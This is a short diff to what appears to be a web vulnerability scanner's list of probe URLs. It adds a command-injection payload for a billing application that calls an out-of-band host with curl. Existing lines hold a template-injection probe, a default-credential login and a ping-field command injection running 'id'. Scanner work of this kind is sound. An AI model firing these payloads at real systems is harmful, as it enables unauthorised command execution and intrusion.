@@ -306,3 +306,4 @@
 {{pagepath}}cfsPreFill=1&first_name=%7B%7B{{num1}}*{{num2}}%7D%7D
 /cgi-bin/webctrl.cgi?action=login_authentication&redirect_action=sysinfo_page&login_username=blueangel&login_password=blueangel&B1=Login
 /cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1%3Bid&B1=PING
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
